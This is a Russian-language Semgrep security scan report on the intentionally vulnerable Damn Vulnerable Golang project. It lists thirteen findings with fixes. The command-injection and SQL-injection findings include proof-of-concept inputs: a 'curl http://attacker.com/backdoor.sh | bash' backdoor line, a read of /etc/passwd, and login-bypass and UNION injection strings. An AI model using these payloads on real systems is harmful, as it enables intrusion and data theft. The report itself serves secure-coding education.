# Отчет о результатах сканирования безопасности: Damn Vulnerable Golang

## Краткое резюме

**Цель:** damn-vulnerable-golang (DVG) — намеренно уязвимый проект для тестирования

**Инструмент:** Semgrep 1.x + пользовательские правила для Go

**Отсканировано файлов:** 1 (main.go)

**Строк кода:** ~150

**Время сканирования:** <1 секунды

### Обзор находок

**Всего находок:** 13

**Распределение по критичности:**

- **HIGH:** 7 находок (54%)
- **MEDIUM:** 6 находок (46%)

**True Positive Rate:** 100% (13/13)

**False Positive Rate:** 0% (0/13)

### Находки по правилам

| Правило | Находок | Критичность | Описание |
| --- | --- | --- | --- |
| hardcoded-credentials | 2 | HIGH | Пароли в исходном коде |
| unsafe-sql-query | 1 | HIGH | SQL Injection |
| unsafe-hash-algorithm | 1 | HIGH | MD5 хеширование |
| unsafe-encryption-algorithm | 2 | HIGH | DES и RC4 шифрование |
| executing-user-input-on-the-server | 1 | HIGH | Command Injection |
| unchecked_errors | 6 | MEDIUM | Игнорирование ошибок |

### Покрытие OWASP Top 10:2025

Обнаруженные уязвимости покрывают **4 категории** из OWASP Top 10:2025:

- **A02: Cryptographic Failures** — 3 находки (MD5, DES, RC4)
- **A03: Injection** — 2 находки (SQL Injection, Command Injection)
- **A04: Insecure Design** — 6 находок (игнорирование ошибок)
- **A07: Identification and Authentication Failures** — 2 находки (захардкоженные пароли)

---

## Детальный анализ находок

### Находка #1: Захардкоженный пароль (HIGH)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 26
- **Правило:** hardcoded-credentials
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **Критичность:** HIGH

**Уязвимый код:**

```go
const password = "secret123"

```

**Описание проблемы:**

Пароль захардкожен в исходном коде как константа. Если код попадет в публичный репозиторий (Git leak), систему контроля версий или логи CI/CD — пароль будет скомпрометирован.

**Риски:**

- Утечка через Git history (даже после удаления из текущей версии)
- Невозможность ротации без редеплоя приложения
- Доступ всем разработчикам с доступом к коду

**Рекомендации:**

```jsx
// Исправление:
password := os.Getenv("APP_PASSWORD")
if password == "" {
    log.Fatal("APP_PASSWORD environment variable not set")
}
```

**Приоритет:** HIGH

---

## Находка #2: Слабый алгоритм хеширования — MD5 (HIGH)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 36
- **Правило:** unsafe-hash-algorithm
- **CWE:** CWE-327 (Use of a Broken Cryptographic Algorithm)
- **Критичность:** HIGH

**Уязвимый код:**

```jsx
hash := md5.New()
```

**Описание проблемы:**

MD5 уязвим к коллизиям. Два разных файла могут иметь одинаковый MD5-хеш, что делает его непригодным для проверки целостности или цифровых подписей.

**Реальный пример атаки:**

В 2008 году исследователи создали поддельный SSL-сертификат с тем же MD5-хешем, что позволило провести MITM атаку.

**Риски:**

- Подделка файлов с сохранением хеша
- Bypass проверки целостности
- Небезопасное хранение паролей (если используется для этого)

**Рекомендации:**

```jsx
// Исправление:
import "crypto/sha256"

hash := sha256.New()
// Для паролей используйте bcrypt:
// hash, _ := bcrypt.GenerateFromPassword([]byte(password), 12)
```

**Приоритет:** HIGH

---

## Находка #3: OS Command Injection (CRITICAL)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 61
- **Правило:** executing-user-input-on-the-server
- **CWE:** CWE-78 (OS Command Injection)
- **Критичность:** HIGH (фактически CRITICAL из-за RCE)

**Уязвимый код:**

```jsx
cmd := exec.Command("sh", "-c", userInput)
```

**Описание проблемы:**

Пользовательский ввод передается напрямую в shell (`sh -c`), что позволяет выполнять произвольные команды на сервере.

**Proof of Concept:**

```jsx
# Атакующий вводит:
userInput = "ls; cat /etc/passwd"

# Результат: выполняются обе команды
# 1. ls — список файлов
# 2. cat /etc/passwd — утечка пользователей системы
```

**Реальный сценарий атаки:**

```jsx
# Установка backdoor:
userInput = "ls; curl http://attacker.com/backdoor.sh | bash"

# Результат: полный контроль над сервером
```

**Риски:**

- **Remote Code Execution (RCE)** — выполнение любого кода
- Чтение конфиденциальных файлов (/etc/passwd, /etc/shadow)
- Установка backdoor'ов
- Lateral movement по инфраструктуре

**Рекомендации:**

**Вариант 1: Отказаться от выполнения пользовательского ввода на сервере**

**Вариант 2: Не использовать exec вообще (рекомендуется)**

```jsx
// Небезопасно:
cmd := exec.Command("sh", "-c", "ping " + host)

// Используйте библиотеку:
import "github.com/sparrc/go-ping"
pinger, _ := ping.NewPinger(host)
pinger.Run()
```

**Вариант 3: Убрать shell, передать аргументы напрямую**

```jsx
// Безопаснее:
cmd := exec.Command("ping", "-c", "1", host)
```

**Вариант 4: Whitelist валидация**

```jsx
if !regexp.MustCompile(`^[a-zA-Z0-9.-]+$`).MatchString(userInput) {
    return errors.New("invalid input")
}
```

**Приоритет:** CRITICAL

---

## Находка #4: Непроверенная ошибка — открытие файла (MEDIUM)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 68
- **Правило:** unchecked_errors
- **CWE:** CWE-252 (Unchecked Return Value)
- **Критичность:** MEDIUM

**Уязвимый код:**

```jsx
f, _ := os.Open("file.txt")
```

**Описание проблемы:**

Ошибка открытия файла игнорируется. Если файл не существует или нет прав доступа, `f` будет `nil`, что приведет к panic при попытке использования.

**Сценарий ошибки:**

```jsx
f, _ := os.Open("file.txt")  // Файл не существует → f = nil
defer f.Close()              // Panic: nil pointer dereference!
```

**Риски:**

- Panic и падение приложения
- Работа с невалидными данными
- DoS (Denial of Service) через краш приложения

**Рекомендации:**

```jsx
// Исправление:
f, err := os.Open("file.txt")
if err != nil {
    return fmt.Errorf("failed to open file: %w", err)
}
defer f.Close()
```

**Приоритет:** MEDIUM

---

## Находка #5: SQL Injection (CRITICAL)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 78
- **Правило:** unsafe-sql-query
- **CWE:** CWE-89 (SQL Injection)
- **Критичность:** HIGH (фактически CRITICAL)

**Уязвимый код:**

```jsx
query := fmt.Sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", 
    username, pass)
```

**Описание проблемы:**

Пользовательский ввод (`username`, `pass`) напрямую встраивается в SQL-запрос через `fmt.Sprintf()` без экранирования.

**Proof of Concept:**

```jsx
// Атакующий вводит:
username = "admin' OR '1'='1"
password = "anything"

// Результирующий SQL:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'

// Результат: Условие '1'='1' всегда истинно → вход без пароля
```

**Расширенная атака (UNION-based):**

```jsx
username = "' UNION SELECT username, password FROM admin_users --"

// Результат: утечка всех паролей администраторов
```

**Риски:**

- **Authentication Bypass** — вход без знания пароля
- **Data Exfiltration** — чтение любых таблиц БД
- **Data Manipulation** — изменение/удаление данных
- **Privilege Escalation** — получение admin-доступа

**Рекомендации:**

```jsx
// Исправление (параметризованный запрос):
query := "SELECT * FROM users WHERE username=? AND password=?"
rows, err := db.Query(query, username, password)
if err != nil {
    return err
}
```

**Дополнительно:**

- Хешировать пароли (bcrypt, не хранить в plaintext)
- Rate limiting для защиты от brute-force
- WAF правила для детектирования SQL-инъекций

**Приоритет:** CRITICAL

---

## Находка #6: Захардкоженные учетные данные БД (HIGH)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 79
- **Правило:** hardcoded-credentials
- **CWE:** CWE-798
- **Критичность:** HIGH

**Уязвимый код:**

```jsx
db, _ := sql.Open("mysql", "user:password@/dbname")
```

**Описание проблемы:**

Database connection string содержит учетные данные в открытом виде. Это более критично, чем находка #1, так как дает прямой доступ к БД.

**Риски:**

- Прямой доступ к БД при утечке кода
- Username + password + database name в одной строке
- Lateral movement при компрометации

**Рекомендации:**

```jsx
// Исправление:
dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)/%s",
    os.Getenv("DB_USER"),
    os.Getenv("DB_PASSWORD"),
    os.Getenv("DB_HOST"),
    os.Getenv("DB_PORT"),
    os.Getenv("DB_NAME"),
)
db, err := sql.Open("mysql", dsn)
if err != nil {
    return err
}
```

**Приоритет:** HIGH 

---

## Находка #7: Непроверенная ошибка — подключение к БД (HIGH)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 79
- **Правило:** unchecked_errors
- **CWE:** CWE-252
- **Критичность:** HIGH (выше, чем обычно для unchecked errors)

**Уязвимый код:**

```jsx
db, _ := sql.Open("mysql", "user:password@/dbname")
```

**Описание проблемы:**

Игнорируется ошибка подключения к БД. Приложение продолжит работу с `db = nil`, что приведет к panic при первом запросе.

**Сценарий:**

```jsx
db, _ := sql.Open(...)  // БД недоступна → db = nil
rows, _ := db.Query("SELECT ...") // Panic: nil pointer!
```

**Риски:**

- Crash приложения при первом запросе к БД
- DoS (приложение неработоспособно)
- Невозможность обработать ситуацию gracefully

**Рекомендации:**

```jsx
// Исправление:
db, err := sql.Open("mysql", dsn)
if err != nil {
    log.Fatalf("Failed to connect to database: %v", err)
}

// Проверка реального подключения:
if err := db.Ping(); err != nil {
    log.Fatalf("Database unreachable: %v", err)
}
```

**Приоритет:** HIGH

---

## Находка #8: Непроверенная ошибка — DES cipher (MEDIUM)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 88
- **Правило:** unchecked_errors
- **CWE:** CWE-252
- **Критичность:** MEDIUM

**Уязвимый код:**

```jsx
block, _ := des.NewCipher(key)
```

**Описание проблемы:**

Игнорируется ошибка создания DES cipher. Если ключ неправильной длины (не 8 байт), `block = nil`.

**Рекомендации:**

```jsx
// Исправление (+ замена DES на AES):
block, err := aes.NewCipher(key) // key = 32 bytes для AES-256
if err != nil {
    return fmt.Errorf("failed to create cipher: %w", err)
}
```

**Приоритет:** MEDIUM

---

## Находка #9: Слабое шифрование — DES (HIGH)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 88
- **Правило:** unsafe-encryption-algorithm
- **CWE:** CWE-327
- **Критичность:** HIGH

**Уязвимый код:**

```jsx
block, _ := des.NewCipher(key)
```

**Описание проблемы:**

DES использует 56-битный ключ, который можно взломать brute-force за несколько часов на современном оборудовании.

**Исторический пример:**

В 1998 году EFF создала машину Deep Crack, которая взламывала DES за 56 часов. Сейчас это можно сделать за минуты на GPU.

**Риски:**

- Расшифровка всех данных, зашифрованных DES
- Нарушение compliance (PCI DSS запрещает DES)

**Рекомендации:**

```jsx
// Исправление:
import "crypto/aes"
import "crypto/cipher"

block, err := aes.NewCipher(key) // key = 32 bytes для AES-256
if err != nil {
    return err
}

gcm, err := cipher.NewGCM(block)
if err != nil {
    return err
}

nonce := make([]byte, gcm.NonceSize())
// ... заполнить nonce случайными данными
encrypted := gcm.Seal(nil, nonce, plaintext, nil)
```

**Приоритет:** HIGH

---

## Находка #10: Непроверенная ошибка — RC4 cipher (MEDIUM)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 114
- **Правило:** unchecked_errors
- **CWE:** CWE-252
- **Критичность:** MEDIUM

**Уязвимый код:**

```jsx
cipher, _ := rc4.NewCipher([]byte("secret"))
```

**Описание проблемы:**

Игнорируется ошибка создания RC4 cipher + захардкожен ключ. Двойная проблема!

**Рекомендации:**

См. находку #11 (замена RC4 на AES-256-GCM).

**Приоритет:** MEDIUM

---

## Находка #11: Слабое шифрование — RC4 (HIGH)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 114
- **Правило:** unsafe-encryption-algorithm
- **CWE:** CWE-327
- **Критичность:** HIGH

**Уязвимый код:**

```jsx
cipher, _ := rc4.NewCipher([]byte("secret"))
```

**Описание проблемы:**

RC4 имеет статистический bias в keystream, что позволяет проводить атаки на зашифрованные данные. Использовался в WEP/WPA — оба были взломаны из-за слабости RC4.

**Реальный пример:**

В 2015 году атака RC4 NOMORE позволила расшифровывать HTTPS-трафик за 52 часа.

**Риски:**

- Расшифровка данных через statistical analysis
- Нарушение compliance (RFC 7465 запрещает RC4 в TLS)

**Рекомендации:**

См. находку #9 (AES-256-GCM) или используйте ChaCha20-Poly1305 для stream encryption.

**Приоритет:** HIGH

---

## Находка #12: Непроверенная ошибка — конвертация строки в число (MEDIUM)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 137
- **Правило:** unchecked_errors
- **CWE:** CWE-252
- **Критичность:** MEDIUM

**Уязвимый код:**

```jsx
num, _ := strconv.Atoi(val)
```

**Описание проблемы:**

Игнорируется ошибка конвертации строки в число. Если `val = "abc"`, то `num = 0` (zero value), что может привести к некорректной логике.

**Сценарий:**

```jsx
val := r.URL.Query().Get("page")  // Пользователь вводит "abc"
num, _ := strconv.Atoi(val)       // num = 0
// Программа работает с num = 0 вместо того, чтобы вернуть ошибку
```

**Риски:**

- Некорректная бизнес-логика
- Security bypass (если используется для access control)

**Рекомендации:**

```jsx
// Исправление:
num, err := strconv.Atoi(val)
if err != nil {
    return fmt.Errorf("invalid number format: %w", err)
}
```

**Приоритет:** MEDIUM

---

## Находка #13: Непроверенная ошибка — Gzip Reader (MEDIUM)

**Метаданные:**

- **Файл:** main.go
- **Строка:** 148
- **Правило:** unchecked_errors
- **CWE:** CWE-252
- **Критичность:** MEDIUM

**Уязвимый код:**

```jsx
gzr, _ := gzip.NewReader(r.Body)
```

**Описание проблемы:**

Игнорируется ошибка создания gzip reader. Если данные не в gzip формате, `gzr = nil`.

**Риски:**

- Panic при попытке чтения
- DoS через некорректные данные

**Рекомендации:**

```jsx
// Исправление:
gzr, err := gzip.NewReader(r.Body)
if err != nil {
    http.Error(w, "Invalid gzip data", http.StatusBadRequest)
    return
}
defer gzr.Close()
```

**Приоритет:** MEDIUM

---

## Метрики и статистика

## Производительность правил

| **Метрика** | **Значение** |
| --- | --- |
| Время сканирования | <1 секунды |
| Отсканировано файлов | 1 (main.go) |
| Проанализировано строк | ~150 |
| Выполнено правил | 6 |
| Всего находок | 13 |
| True Positives | 13 (100%) |
| False Positives | 0 (0%) |

## Распределение по критичности

| **Критичность** | **Количество** | **Процент** |
| --- | --- | --- |
| CRITICAL (фактически) | 2 | 15% |
| HIGH | 5 | 39% |
| MEDIUM | 6 | 46% |

**Примечание:** SQL Injection (находка #5) и Command Injection (находка #3) классифицированы как HIGH, но фактически CRITICAL из-за возможности RCE и Authentication Bypass.

## Покрытие CWE

| **CWE** | **Описание** | **Находок** |
| --- | --- | --- |
| CWE-78 | OS Command Injection | 1 |
| CWE-89 | SQL Injection | 1 |
| CWE-252 | Unchecked Return Value | 6 |
| CWE-327 | Weak Cryptography | 3 |
| CWE-798 | Hardcoded Credentials | 2 |

---

## Рекомендации по приоритетам

## CRITICAL

1. **Находка #3:** OS Command Injection (строка 61)
    - Отказаться от выполнения пользовательского ввода
    - Заменить `exec.Command("sh", "-c", userInput)` на библиотеку
    - Или использовать whitelist валидацию
2. **Находка #5:** SQL Injection (строка 78)
    - Использовать параметризованные запросы
    - Добавить rate limiting

## HIGH

1. **Находка #1:** Захардкоженный пароль (строка 26)
    - Перенести в environment variables
2. **Находки #6 + #7:** Захардкоженные учетные данные БД + непроверенная ошибка (строка 79)
    - Перенести в environment variables
    - Сменить пароль БД
    - Добавить проверку ошибки

## HIGH

1. **Находка #2:** MD5 Hash (строка 36)
    - Заменить на SHA-256 или bcrypt (для паролей)
2. **Находка #9:** DES Encryption (строка 88)
    - Заменить на AES-256-GCM
3. **Находка #11:** RC4 Encryption (строка 114)
    - Заменить на AES-256-GCM или ChaCha20

## MEDIUM

1. **Находки #4, #8, #10, #12, #13:** Непроверенные ошибки
    - Добавить обработку всех критичных ошибок

---

## Заключение

Сканирование Damn Vulnerable Golang с помощью разработанных пользовательских Semgrep правил успешно обнаружило **13 реальных уязвимостей** с **100% точностью** (все находки — True Positives) и **0% false positive rate**.